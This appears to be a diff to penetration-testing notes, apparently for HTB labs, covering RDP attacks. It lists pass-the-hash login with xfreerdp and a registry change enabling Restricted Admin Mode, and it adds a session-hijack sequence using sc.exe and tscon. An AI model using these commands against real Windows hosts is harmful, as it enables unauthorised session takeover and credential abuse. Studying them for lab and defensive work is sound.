@@ -168,6 +168,20 @@ sa
 | `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f` | Enable "Restricted Admin Mode" on the target Windows host. |
 | `xfreerdp /v:192.168.2.141 /u:admin /pth:A9FDFA038C4B75EBC76DC855DD74F0DA` | Use the Pass-The-Hash technique to login on the target host without a password. |
 
+```
+C:\htb> query user
+
+ USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
+>juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
+ lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM
+
+C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
+
+[SC] CreateService SUCCESS
+
+C:\htb> net start sessionhijack
+```
+> This method no longer works on Server 2019.
 
 ---
 ## Attacking DNS
